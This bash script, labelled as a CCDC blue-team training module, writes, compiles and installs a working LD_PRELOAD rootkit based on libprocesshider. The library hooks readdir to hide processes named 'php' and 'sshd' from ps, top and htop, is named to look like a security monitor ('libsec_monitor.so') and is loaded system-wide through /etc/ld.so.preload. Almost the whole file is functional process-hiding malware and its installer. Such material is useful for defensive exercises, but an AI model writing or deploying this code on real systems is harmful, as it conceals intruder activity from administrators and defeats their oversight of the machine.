#!/bin/bash
################################################################################
# CCDC_Linux_LDPRELOAD_LoadsOfIssues.sh
#
# Blue Team Training Script - LD_PRELOAD Process Hiding
# Compatible with: Ubuntu, Debian, CentOS, RHEL, Fedora
#
# Installs a system-wide LD_PRELOAD library that hides named processes
# (php, sshd) from ps/top/htop and breaks ss -p process attribution.
# Based on: github.com/gianlucaborello/libprocesshider
#
# NOTE: This is for authorized training environments only!
################################################################################

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

detect_distro() {
    if [ -f /etc/os-release ]; then
        . /etc/os-release
        DISTRO_NAME="$ID"
        DISTRO_VER="$VERSION_ID"
    else
        DISTRO_NAME="unknown"
        DISTRO_VER="unknown"
    fi
}

detect_lib_path() {
    if [ -d "/usr/lib64" ]; then
        echo "/usr/lib64"
    elif [ -d "/usr/lib/x86_64-linux-gnu" ]; then
        echo "/usr/lib/x86_64-linux-gnu"
    else
        echo "/usr/lib"
    fi
}

if [[ $EUID -ne 0 ]]; then
   echo -e "${RED}This script must be run as root${NC}"
   exit 1
fi

detect_distro
LIB_PATH=$(detect_lib_path)

echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}CCDC LD_PRELOAD Training Module Setup${NC}"
echo -e "${BLUE}Detected: $DISTRO_NAME $DISTRO_VER${NC}"
echo -e "${BLUE}Library Path: $LIB_PATH${NC}"
echo -e "${BLUE}========================================${NC}"
echo ""

# Step 1: Write the C source for the process-hiding library
echo -e "${YELLOW}[*] Step 1: Writing LD_PRELOAD process-hiding library source...${NC}"

PRELOAD_SOURCE_DIR="/tmp/lib_build"
mkdir -p "$PRELOAD_SOURCE_DIR"

cat > "$PRELOAD_SOURCE_DIR/libsec_monitor.c" << 'CSRC'
#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>

/* Process names to hide from ps/top/htop and ss -p process attribution.
 * Add or remove entries as needed; terminate the list with NULL. */
static const char *processes_to_hide[] = {
    "php",
    "sshd",
    NULL
};

static int get_dir_name(DIR *dirp, char *buf, size_t size) {
    int fd = dirfd(dirp);
    if (fd == -1) return 0;
    char tmp[64];
    snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);
    ssize_t ret = readlink(tmp, buf, size);
    if (ret == -1) return 0;
    buf[ret] = 0;
    return 1;
}

static int get_process_name(char *pid, char *buf) {
    if (strspn(pid, "0123456789") != strlen(pid)) return 0;
    char tmp[256];
    snprintf(tmp, sizeof(tmp), "/proc/%s/stat", pid);
    FILE *f = fopen(tmp, "r");
    if (!f) return 0;
    if (fgets(tmp, sizeof(tmp), f) == NULL) { fclose(f); return 0; }
    fclose(f);
    int unused;
    sscanf(tmp, "%d (%[^)]s", &unused, buf);
    return 1;
}

static int should_hide(const char *name) {
    for (int i = 0; processes_to_hide[i]; i++)
        if (strcmp(name, processes_to_hide[i]) == 0) return 1;
    return 0;
}

#define DECLARE_READDIR(dirent, readdir)                                \
static struct dirent *(*original_##readdir)(DIR *) = NULL;             \
struct dirent *readdir(DIR *dirp) {                                     \
    if (!original_##readdir) {                                          \
        original_##readdir = dlsym(RTLD_NEXT, #readdir);               \
        if (!original_##readdir) return NULL;                           \
    }                                                                   \
    struct dirent *dir;                                                 \
    while (1) {                                                         \
        dir = original_##readdir(dirp);                                 \
        if (dir) {                                                       \
            char dir_name[256], process_name[256];                      \
            if (get_dir_name(dirp, dir_name, sizeof(dir_name)) &&       \
                strcmp(dir_name, "/proc") == 0 &&                       \
                get_process_name(dir->d_name, process_name) &&          \
                should_hide(process_name)) continue;                    \
        }                                                               \
        break;                                                          \
    }                                                                   \
    return dir;                                                         \
}

DECLARE_READDIR(dirent64, readdir64);
DECLARE_READDIR(dirent, readdir);
CSRC

echo -e "${GREEN}[+] Source written to $PRELOAD_SOURCE_DIR/libsec_monitor.c${NC}"
echo -e "${GREEN}    (based on github.com/gianlucaborello/libprocesshider)${NC}"

# Step 2: Install GCC if not present
echo -e "${YELLOW}[*] Step 2: Ensuring GCC is installed...${NC}"
if ! command -v gcc &> /dev/null; then
    case "$DISTRO_NAME" in
        ubuntu|debian|kali|linuxmint|pop)
            apt-get install -y -qq gcc 2>/dev/null && echo -e "${GREEN}[+] GCC installed via apt${NC}" \
                || echo -e "${YELLOW}[!] apt GCC install failed${NC}"
            ;;
        centos|rhel|rocky|almalinux|ol)
            yum install -y gcc 2>/dev/null && echo -e "${GREEN}[+] GCC installed via yum${NC}" \
                || echo -e "${YELLOW}[!] yum GCC install failed${NC}"
            ;;
        fedora)
            dnf install -y gcc 2>/dev/null && echo -e "${GREEN}[+] GCC installed via dnf${NC}" \
                || echo -e "${YELLOW}[!] dnf GCC install failed${NC}"
            ;;
        *)
            if command -v apt-get &>/dev/null; then
                apt-get install -y -qq gcc 2>/dev/null
            elif command -v dnf &>/dev/null; then
                dnf install -y gcc 2>/dev/null
            elif command -v yum &>/dev/null; then
                yum install -y gcc 2>/dev/null
            fi
            ;;
    esac
else
    echo -e "${GREEN}[+] GCC already installed${NC}"
fi

# Step 3: Compile the library
echo -e "${YELLOW}[*] Step 3: Compiling LD_PRELOAD library...${NC}"

if command -v gcc &> /dev/null; then
    if gcc -fPIC -shared -o "$PRELOAD_SOURCE_DIR/libsec_monitor.so" \
        "$PRELOAD_SOURCE_DIR/libsec_monitor.c" -ldl 2>/dev/null; then
        echo -e "${GREEN}[+] Successfully compiled libsec_monitor.so${NC}"
        if cp "$PRELOAD_SOURCE_DIR/libsec_monitor.so" "$LIB_PATH/libsec_monitor.so"; then
            chmod 644 "$LIB_PATH/libsec_monitor.so"
            echo -e "${GREEN}[+] Installed to $LIB_PATH/libsec_monitor.so${NC}"
        else
            echo -e "${YELLOW}[!] Could not copy compiled library to $LIB_PATH${NC}"
        fi
    else
        echo -e "${YELLOW}[!] Compilation failed${NC}"
    fi
else
    echo -e "${RED}[-] GCC unavailable after install attempt — skipping library compilation${NC}"
fi

# Step 4: Set up system-wide LD_PRELOAD
echo -e "${YELLOW}[*] Step 4: Setting up /etc/ld.so.preload...${NC}"

LD_PRELOAD_FILE="/etc/ld.so.preload"

if [ -f "$LD_PRELOAD_FILE" ]; then
    cp "$LD_PRELOAD_FILE" "${LD_PRELOAD_FILE}.bak"
    echo -e "${GREEN}[+] Backed up existing /etc/ld.so.preload${NC}"
fi

if [ -f "$LIB_PATH/libsec_monitor.so" ]; then
    echo "$LIB_PATH/libsec_monitor.so" > "$LD_PRELOAD_FILE"
    chmod 644 "$LD_PRELOAD_FILE"
    echo -e "${GREEN}[+] Updated /etc/ld.so.preload${NC}"
else
    echo -e "${YELLOW}[!] Library not found — /etc/ld.so.preload not updated${NC}"
fi

echo ""
echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}LD_PRELOAD Training Module Setup Complete!${NC}"
echo -e "${GREEN}========================================${NC}"
echo ""
echo -e "${BLUE}Library:${NC}             $LIB_PATH/libsec_monitor.so"
echo -e "${BLUE}System-Wide Preload:${NC} /etc/ld.so.preload"
echo ""
echo -e "${YELLOW}Effect:${NC}"
echo -e "  Processes named 'php' and 'sshd' are hidden from ps/top/htop."
echo -e "  ps aux | grep php            — should return nothing"
echo -e "  ps aux | grep sshd           — should return nothing"
echo -e "  ss -tulpn still shows open ports; ss -p won't show the process name."
echo ""
echo -e "${YELLOW}REMINDER: This is for authorized training only!${NC}"
echo ""
